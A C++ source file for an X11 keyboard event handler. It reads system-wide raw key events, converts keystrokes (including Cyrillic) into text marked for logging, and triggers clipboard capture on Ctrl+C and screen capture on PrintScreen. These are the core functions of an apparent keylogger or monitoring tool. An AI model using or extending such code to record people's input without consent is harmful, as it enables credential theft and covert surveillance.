#include "keyboardEventHelper.hpp"
#include "../cyrillicHelper/cyrillicHelper.hpp"
#include "../specialKeysHelper/specialKeysHelper.hpp"
#include <cstring>

KeyboardEventHandler::KeyboardEventHandler(Display* disp)
    : display(disp), ctrlPressed(false) {}

ProcessedEvent KeyboardEventHandler::handleEvent(XEvent& event) {
    if (event.xcookie.type != GenericEvent) {
        return {}; 
    }

    XGetEventData(display, &event.xcookie);

    switch (event.xcookie.evtype) {
        case XI_RawKeyPress: {
            XIRawEvent* rawev = (XIRawEvent*)event.xcookie.data;
            ProcessedEvent result = processRawKeyPress(rawev);
            return result;
        }
        case XI_RawKeyRelease: {
            XIRawEvent* rawev = (XIRawEvent*)event.xcookie.data;
            processRawKeyRelease(rawev);
            break;
        }
        default:
            break;
    }
    
    return {};
}

void KeyboardEventHandler::processRawKeyRelease(XIRawEvent* rawev) {
    KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, 0);
    if (keysym == XK_Control_L) {
        ctrlPressed = false;
    }
}

ProcessedEvent KeyboardEventHandler::processRawKeyPress(XIRawEvent* rawev) {
    ProcessedEvent result;
    XkbStateRec state;
    XkbGetState(display, XkbUseCoreKbd, &state);

    bool isShiftPressed = (state.mods & ShiftMask);
    bool isCapsLockOn  = (state.mods & LockMask);
    int level = isShiftPressed ^ isCapsLockOn;

    KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, state.group, level);
    if (keysym == NoSymbol) {
        keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, level);
    }
    if (keysym == NoSymbol) {
        return {};
    }

    if ((keysym == XK_c || keysym == XK_C || keysym == XK_Cyrillic_es || keysym == XK_Cyrillic_ES) && ctrlPressed) {
        result.action = KeyboardAction::CAPTURE_CLIPBOARD;
        return result;
    }

    switch (keysym) {
        case XK_Control_L:
            ctrlPressed = true;
            result.printable_name = "Control_L";
            result.action = KeyboardAction::NONE;
            return result;

        case XK_Print:
            result.action = KeyboardAction::CAPTURE_SCREEN;
            result.printable_name = "PrintScreen";
            return result;

        case XK_Escape:
            result.action = KeyboardAction::EXIT_APP;
            result.printable_name = "Escape";
            return result;
        
        case XK_BackSpace:
             result.action = KeyboardAction::HANDLE_BACKSPACE;
             result.printable_name = "Backspace";
             return result;

        default:
        {
            std::string special_char = handleSpecialKeys(keysym);
            if (!special_char.empty()) {
                result.text_to_log = special_char;
                result.printable_name = special_char;
            } else {
                const char* cyrillic_char = keysymToUtf8Cyrillic(keysym);
                if (cyrillic_char) {
                    result.text_to_log = cyrillic_char;
                    result.printable_name = cyrillic_char;
                } else {
                    const char* key_name = XKeysymToString(keysym);
                    if (key_name) {
                        result.printable_name = key_name;
                        if (strlen(key_name) == 1) { 
                            result.text_to_log = key_name;
                        }
                    }
                }
            }
            
            if (!result.text_to_log.empty()){
                result.action = KeyboardAction::LOG_TEXT;
            }
            break; 
        }
    }

    return result;
}